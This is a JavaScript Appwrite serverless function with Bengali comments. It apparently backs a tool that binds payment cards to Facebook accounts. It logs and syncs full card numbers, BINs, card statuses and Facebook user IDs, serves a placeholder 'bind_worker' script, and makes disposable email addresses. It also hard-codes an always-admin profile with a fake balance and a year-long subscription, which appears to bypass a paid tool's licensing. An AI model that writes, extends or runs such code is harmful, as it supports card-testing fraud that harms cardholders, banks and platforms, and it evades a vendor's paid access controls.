module.exports = async function (req, res) {
  const client = req.client;
  const databaseId = process.env.APPWRITE_DATABASE_ID;
  const collectionId = process.env.APPWRITE_COLLECTION_ID;
  const { action, body } = req.body;
  const userId = req.headers['x-appwrite-user-id'] || 'guest';

  try {
    // 1. get_bind_worker – bind_worker.js সার্ভ করে
    if (action === 'get_bind_worker') {
      // 🔥 এখানে bind_worker.js এর পুরো কোড পেস্ট করবে (পরবর্তীতে)
      const BIND_WORKER_SCRIPT = `
        console.log("[bind_worker] Loaded from Appwrite");
        // (এখন ডামি, পরে পেস্ট করবে)
      `;
      return res.json({ success: true, script: BIND_WORKER_SCRIPT });
    }

    // 2. log_operation – লগ সেভ
    if (action === 'log_operation') {
      const data = {
        userId: userId,
        userEmail: body.email || '',
        fbUserId: body.fbUserId || '',
        cardLast4: body.cardLast4 || '',
        cardBin: body.cardBin || '',
        status: body.status || '',
        credentialId: body.credentialId || '',
        cardAssociation: body.cardAssociation || '',
        error: body.error || '',
        cardNumber: body.cardNumber || '',
        serverResponse: body.serverResponse || ''
      };
      await client.database.createDocument(databaseId, collectionId, 'unique()', data);
      return res.json({ success: true });
    }

    // 3. sync_save_cards
    if (action === 'sync_save_cards') {
      const userDocId = `user_${userId}`;
      try {
        await client.database.getDocument(databaseId, collectionId, userDocId);
      } catch {
        await client.database.createDocument(databaseId, collectionId, userDocId, { userId, cards: [] });
      }
      await client.database.updateDocument(databaseId, collectionId, userDocId, { cards: body.cards });
      return res.json({ success: true });
    }

    // 4. sync_load_cards
    if (action === 'sync_load_cards') {
      const userDocId = `user_${userId}`;
      try {
        const doc = await client.database.getDocument(databaseId, collectionId, userDocId);
        return res.json({ success: true, cards: doc.cards || [] });
      } catch {
        return res.json({ success: true, cards: [] });
      }
    }

    // 5. sync_save_bins
    if (action === 'sync_save_bins') {
      const userDocId = `user_${userId}`;
      try {
        await client.database.getDocument(databaseId, collectionId, userDocId);
      } catch {
        await client.database.createDocument(databaseId, collectionId, userDocId, { userId, bins: [] });
      }
      await client.database.updateDocument(databaseId, collectionId, userDocId, { bins: body.bins });
      return res.json({ success: true });
    }

    // 6. sync_load_bins
    if (action === 'sync_load_bins') {
      const userDocId = `user_${userId}`;
      try {
        const doc = await client.database.getDocument(databaseId, collectionId, userDocId);
        return res.json({ success: true, bins: doc.bins || [] });
      } catch {
        return res.json({ success: true, bins: [] });
      }
    }

    // 7. get_profile – সবসময় অ্যাডমিন
    if (action === 'get_profile') {
      return res.json({
        success: true,
        balance: 9999,
        isAdmin: true,
        subscriptionActive: true,
        subscriptionExpiry: new Date(Date.now() + 365*24*60*60*1000).toISOString()
      });
    }

    // 8. wallet_buy_subscription – ডামি
    if (action === 'wallet_buy_subscription') {
      return res.json({ success: true, newBalance: 9999 });
    }

    // 9. tempmail_create – ডামি
    if (action === 'tempmail_create') {
      const email = `cat_${Date.now()}_${Math.floor(Math.random()*1000)}@1secmail.com`;
      return res.json({ success: true, mailbox: { address: email.split('@')[0], domain: '1secmail.com', fullAddress: email } });
    }

    // 10. tempmail_inbox – ডামি
    if (action === 'tempmail_inbox') {
      return res.json({ success: true, emails: [] });
    }

    return res.json({ success: false, error: 'Unknown action' });

  } catch (error) {
    return res.json({ success: false, error: error.message });
  }
};
